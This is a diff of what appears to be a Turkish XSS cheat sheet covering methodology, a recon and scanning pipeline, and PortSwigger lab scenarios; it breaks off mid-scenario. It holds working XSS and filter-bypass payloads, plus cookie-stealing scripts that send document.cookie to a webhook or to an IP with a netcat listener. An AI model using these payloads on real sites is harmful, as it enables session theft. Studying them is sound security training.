@@ -751,7 +751,7 @@ forum: {
                         <input type="password" id="password-input" placeholder="Parolanız" required style="width:100%; margin-bottom:10px; padding:10px; border-radius:8px; border:1px solid var(--glass); background:var(--bg); color:white;">
                         <div class="tool-buttons">
                             <button type="submit" id="login-email-btn">Giriş Yap</button>
-                            <button type="button" id="register-email-btn">Kaydol</button>
+                            <button type="button" id="register-email-btn" disabled>Kaydol</button>
                             <p class="small-info" style="font-size: 0.8em; color: #aaa; margin-top: 5px;">*Kayıtlar şimdilik kapalıdır.</p>
                         </div>
                     </form>
@@ -797,6 +797,7 @@ baslangic: {
         }
     ]
 },
+
 xss: {
     menuName: 'XSS',
     icon: 'icon-code',
@@ -805,27 +806,32 @@ xss: {
     description: 'Reflected, Stored, DOM ve Blind XSS türleri için kısa metodoloji.',
     sections: [
             {
-                "title": "Reflected XSS",
-                "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Tarayıcıda JavaScript kodu çalıştırılarak ortaya çıkan zafiyet türüdür. Girdi alanlarında ve URL parametrelerinde denenebilir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><code>example.com/search?q=test'</code> &rarr; Sayfa kaynağını görüntüle (CTRL+U) &rarr; 'test' kelimesini arat. Payload sunucu tarafından encode ediliyor mu kontrol et.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Eğer girdi encode edilmiyorsa, <code>\"/></code> gibi karakterlerle mevcut HTML etiketini kapatıp kendi script kodumuzu enjekte edebiliriz.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Örnek Payload: <code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>\n\t\t\t</ul>"
+              "title": "Reflected XSS",
+              "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Tarayıcıda JavaScript kodu çalıştırılarak ortaya çıkan zafiyet türüdür. Girdi alanlarında ve URL parametrelerinde denenebilir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><code>example.com/search?q=test'</code> &rarr; Sayfa kaynağını görüntüle (CTRL+U) &rarr; 'test' kelimesini arat. Payload sunucu tarafından encode ediliyor mu kontrol et.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Eğer girdi encode edilmiyorsa, <code>\"/></code> gibi karakterlerle mevcut HTML etiketini kapatıp kendi script kodumuzu enjekte edebiliriz.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Örnek Payload: <code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>\n\t\t\t</ul>"
             },
             {
-                "title": "Stored XSS",
-                "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Sayfayı ziyaret eden herkesi etkileyen kalıcı XSS türüdür.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Kullanıcıdan girdi alınan (yorum, profil bilgisi, mesaj vb.) ve veritabanına kaydedilen her yerde denenebilir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Örnek Payload: <code>&lt;a href='javascript:alert(document.cookie);'&gt;Click Me&lt;/a&gt;</code></li>\n\t\t\t</ul>"
+              "title": "Stored XSS",
+              "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Sayfayı ziyaret eden herkesi etkileyen kalıcı XSS türüdür.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Kullanıcıdan girdi alınan (yorum, profil bilgisi, mesaj vb.) ve veritabanına kaydedilen her yerde denenebilir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Örnek Payload: <code>&lt;a href='javascript:alert(document.cookie);'&gt;Click Me&lt;/a&gt;</code></li>\n\t\t\t</ul>"
             },
             {
-                "title": "DOM XSS",
-                "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Tarayıcı tarafında, JavaScript ile kullanıcıdan gelen verinin (URL hash, search, localStorage vb.) DOM'a güvenli olmayan bir şekilde yazdırılmasıyla oluşur.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Tehlikeli fonksiyonlar (sink): <code>innerHTML</code>, <code>document.write</code>, <code>eval()</code>, <code>insertAdjacentHTML</code>.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Hızlı test: URL'deki hash (#) veya query (?) parametresini değiştirin. Eğer bu değer sayfada bir yere yazılıyorsa, kaynak kodunu inceleyerek hangi fonksiyonun kullanıldığını kontrol edin. <code>textContent</code> güvenli iken <code>innerHTML</code> tehlikelidir.</li>\n\t\t\t</ul>"
+              "title": "DOM XSS",
+              "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Tarayıcı tarafında, JavaScript ile kullanıcıdan gelen verinin (URL hash, search, localStorage vb.) DOM'a güvenli olmayan bir şekilde yazdırılmasıyla oluşur.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Tehlikeli fonksiyonlar (sink): <code>innerHTML</code>, <code>document.write</code>, <code>eval()</code>, <code>insertAdjacentHTML</code>.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Hızlı test: URL'deki hash (#) veya query (?) parametresini değiştirin. Eğer bu değer sayfada bir yere yazılıyorsa, kaynak kodunu inceleyerek hangi fonksiyonun kullanıldığını kontrol edin. <code>textContent</code> ve <code>innerText</code> güvenli iken <code>innerHTML</code> tehlikelidir.</li>\n\t\t\t</ul>"
             },
             {
-                "title": "Blind XSS",
-                "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Payload'ın başka bir kullanıcı (genellikle admin) tarafından ve farklı bir sayfada (örn: admin paneli) tetiklenmesiyle oluşan XSS türüdür. Anında sonuç görülmez.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>Webhook Kullanımı:</b> XSS'in tetiklendiğini anlamak için dışarıya veri gönderme mekanizmasıdır. Payload'ın tetiklendiği cihazın IP, User-Agent veya Cookie bilgilerini saldırganın dinleme noktasına (örn: <code>webhook.site</code>) iletir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Örnek Webhook Payload (Çerez çalma):<br><code>&lt;/textarea&gt;&lt;script&gt;new Image().src='https://[WEBHOOK_ADRESINIZ]?cookie='+document.cookie;&lt;/script&gt;</code></li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Basit Blind Test Payload: <code>&quot;&gt;&lt;script src=https://xss.hunter.com&gt;&lt;/script&gt;</code></li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Netcat ile Test: <code>nc -nvlp 4040</code> (Terminalde dinleme)<br>Payload:<code>&lt;/textarea&gt;&lt;script&gt;fetch('http://10.10.198.12:4040?cookie=' + btoa(document.cookie) );&lt;/script&gt;</code> (Çerezleri Base64 ile kodlayıp gönderir.)</li>\n\t\t\t</ul>"
+              "title": "Blind XSS",
+              "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Payload'ın başka bir kullanıcı (genellikle admin) tarafından ve farklı bir sayfada (örn: admin paneli) tetiklenmesiyle oluşan XSS türüdür. Anında sonuç görülmez.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>Webhook Kullanımı:</b> XSS'in tetiklendiğini anlamak için dışarıya veri gönderme mekanizmasıdır. Payload'ın tetiklendiği cihazın IP, User-Agent veya Cookie bilgilerini saldırganın dinleme noktasına (örn: <code>webhook.site</code>) iletir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Örnek Webhook Payload (Çerez çalma):<br><code>&lt;/textarea&gt;&lt;script&gt;new Image().src='https://[WEBHOOK_ADRESINIZ]?cookie='+document.cookie;&lt;/script&gt;</code></li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Basit Blind Test Payload: <code>&quot;&gt;&lt;script src=https://xss.hunter.com&gt;&lt;/script&gt;</code></li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Netcat ile Test: <code>nc -nvlp 4040</code> (Terminalde dinleme)<br>Payload:<code>&lt;/textarea&gt;&lt;script&gt;fetch('http://10.10.198.12:4040?cookie=' + btoa(document.cookie) );&lt;/script&gt;</code> (Çerezleri Base64 ile kodlayıp gönderir.)</li>\n\t\t\t</ul>"
             },
-{
-            "title": "Roadmap - Otomatik Test Akışı",
-            "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">XSS taramalarına başlamadan önce hedef domainin alt alanlarını, canlı URL'lerini ve parametrelerini otomatik olarak toplama adımları.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>1. Alt Alan ve Canlı URL Toplama:</b><br>Tüm alt alanları topla, sadece 200 (OK) dönenleri <code>status200.txt</code> dosyasına kaydet.\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">subfinder -d example.com -silent -o subdomains.txt\ncat subdomains.txt | httpx -silent -o live_subdomains.txt\ncat live_subdomains.txt | httpx -status-code -mc 200 -silent > status200.txt</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\t\t\t\t</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>2. Yansıtılan Parametreleri Bulma (Parameter-Reflect-Finder):</b><br>Canlı URL'lerde yansıtma yapan parametreleri tespit et. Çıkan sorgulara <code>jUbAeR'\"<></code> payload'ı ile manuel test et.\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">cd parameter-reflect-finder/\npython3 tool.py [ALAN_ADI_VEYA_LISTE_VER]</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\t\t\t\t</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>3. Tüm Parametreleri Toplama (ParamSpider):</b><br>Canlı URL listesini döngüye alarak tüm olası parametreleri topla.\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">cat status200.txt | while read line; do python3 paramspider.py -d $line -o output/; done</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\t\t\t\t</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>4. Otomatik XSS Taraması (Dalfox ve XSS Strike):</b><br>Toplanan parametreli URL'ler için Dalfox'u listeyle veya XSS Strike'ı tek URL/parametre için kullan.\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">dalfox file status200.txt -o dalfox_results.txt</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\n\t\t\t\t\t\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">python3 xsstrike.py -u https://example.com/?id=neon</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\t\t\t\t</li>\n\t\t\t</ul>"
-        }
-    ]
+            {
+              "title": "Roadmap - Otomatik Test Akışı",
+              "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">XSS taramalarına başlamadan önce hedef domainin alt alanlarını, canlı URL'lerini ve parametrelerini otomatik olarak toplama adımları.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>1. Alt Alan ve Canlı URL Toplama:</b><br>Tüm alt alanları topla, sadece 200 (OK) dönenleri <code>status200.txt</code> dosyasına kaydet.\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">subfinder -d example.com -silent -o subdomains.txt\ncat subdomains.txt | httpx -silent -o live_subdomains.txt\ncat live_subdomains.txt | httpx -status-code -mc 200 -silent > status200.txt</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\t\t\t\t</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>2. Yansıtılan Parametreleri Bulma (Parameter-Reflect-Finder):</b><br>Canlı URL'lerde yansıtma yapan parametreleri tespit et. Çıkan sorgulara <code>jUbAeR'\"<></code> payload'ı ile manuel test et.\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">cd parameter-reflect-finder/\npython3 tool.py [ALAN_ADI_VEYA_LISTE_VER]</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\t\t\t\t</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>3. Tüm Parametreleri Toplama (ParamSpider):</b><br>Canlı URL listesini döngüye alarak tüm olası parametreleri topla.\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">cat status200.txt | while read line; do python3 paramspider.py -d $line -o output/; done</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\t\t\t\t</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>4. Otomatik XSS Taraması (Dalfox ve XSS Strike):</b><br>Toplanan parametreli URL'ler için Dalfox'u listeyle veya XSS Strike'ı tek URL/parametre için kullan.\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">dalfox file status200.txt -o dalfox_results.txt</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\n\t\t\t\t\t\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">python3 xsstrike.py -u https://example.com/?id=neon</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\t\t\t\t</li>\n\t\t\t</ul>"
+            },
+            {
+              "title": "Örnek Senaryolar",
+              "content": "<ul style='list-style:none;padding:0;margin:0;display:grid;gap:8px'>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 1 - Reflected XSS (HTML Tag Injection)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;p&gt;\n\t&lt;a id=\"author\" href=\"https://x.com\"&gt;&lt;/a&gt;\n\t{PAYLOAD}\n\t&lt;img class=\"avatar\" src=\"/resources/images/avatarDefault.svg\"&gt;\n&lt;/p&gt;</pre><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;/p&gt;&lt;img src=x onerror=alert(1)&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 2 - Reflected XSS (Event Handler - onresize)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;h1&gt;0 search results for 'neon'&lt;/h1&gt;</pre><div style='margin-top:5px;'>Sadece belirli taglere izin veriliyor. Deneme icin Intruder kullanildi.</div><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>neon'&lt;/h1&gt;&lt;body onresize=print()&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 3 - Reflected XSS (Custom Tag &amp; onfocus)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;h1&gt;0 search results for 'neon'&lt;/h1&gt;</pre><div style='margin-top:5px;'>Lab sadece ozel etiketlere (custom tags) izin veriyor.</div><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>neon'&lt;/h1&gt;&lt;turgay onfocus=alert(document.cookie) autofocus tabindex=0&gt;&lt;/turgay&gt;</pre><strong style='margin-top:10px;display:block;'>Not:</strong><div style='margin-top:5px;'><b>tabindex=0 (ekleme sebebi)</b> -&gt; Tarayıcılar, <code>autofocus</code>'a rağmen özel tag'lere nasıl odaklanacağını bilemez. <code>tabindex=0</code> bunu zorunlu kılar.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 4 - Reflected XSS (SVG &amp; animatetransform)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;h1&gt;0 search results for 'neon'&lt;/h1&gt;</pre><strong style='margin-top:10px;display:block;'>Keşif Süreci (Açıklama):</strong><div style='margin-top:5px;'>1. <code>?search=&lt;$neon$&gt;</code> -&gt; Intruder -&gt; Tüm HTML tag'lerini tara. (Lab'ın <code>svg</code> tag'ine izin verdiğini keşfet.)<br>2. <code>?search=&lt;svg&gt;&lt;$neon$&gt;</code> -&gt; Intruder -&gt; <code>animate</code>, <code>animatemotion</code>, <code>animatetransform</code> gibi SVG tag'lerini tara. (<code>animatetransform</code> tag'ine izin verdiği keşfet.)<br>3. <code>?search=&lt;svg&gt;&lt;animatetransform%20$neon$=alert(1)&gt;</code> -&gt; Intruder -&gt; Tüm event handler'ları (<code>onbegin</code>, <code>onload</code> vb.) tara. (<code>onbegin</code> event'ine izin verdiği keşfet.)</div><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 5 - Reflected XSS (link canonical &amp; accesskey)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;link rel=\"canonical\" href='https://0a1c.web-security-academy.net/'/&gt;</pre><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>'accesskey='x'onclick='alert(1)</pre><strong style='margin-top:10px;display:block;'>Zafiyetli URL:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>https://0a1c.web-security-academy.net/'accesskey='x'onclick='alert(1)</pre><strong style='margin-top:10px;display:block;'>Not:</strong><div style='margin-top:5px;'>Payload, <code>href</code> attribute'ünden kaçar ve <code>&lt;link&gt;</code> tag'ine <code>onclick</code> ekler. Kullanici ALT + X (veya ALT + SHIFT + X) tuslarina bastiginda XSS tetiklenir.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 6 - Reflected XSS (onclick sink &amp; &amp;apos; bypass)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;!-- Sunucu, 'Website' girdisini alıp hem href'e hem onclick'e basıyor --&gt;\n&lt;a id=\"author\"\n\thref=\"{PAYLOAD}\" \n\tonclick=\"var tracker={track(){}};\n\ttracker.track('{PAYLOAD}');\"&gt;\n\tTurgay Kara\n&lt;/a&gt;</pre><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>http://turgay?&amp;apos;-alert(1)-&amp;apos;</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Sunucu, <code>'</code> karakterini <code>&amp;apos;</code> olarak HTML-encode eder. Bu, <code>href</code> attribute'ünü bozmaz. Ancak HTML parser, sayfayı render ederken <code>onclick</code> içindeki <code>&amp;apos;</code> kodunu tekrar <code>'</code> karakterine çevirir. Tıklandığında JS, <code>tracker.track('http://turgay?'</code> (string biter) <code>-alert(1)-</code> (kod çalışır) <code>''</code> (boş string) olarak çalışır.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 7 - DOM XSS (javascript: in href)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;a id='author' href='PAYLOAD'&gt;neon&lt;/a&gt;</pre><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>javascript:alert(1)</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 8 - DOM XSS (jQuery :contains sink)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n\t$(window).on('hashchange', function(){\n\t\tvar post = $('section.blog-list h2:contains(' + 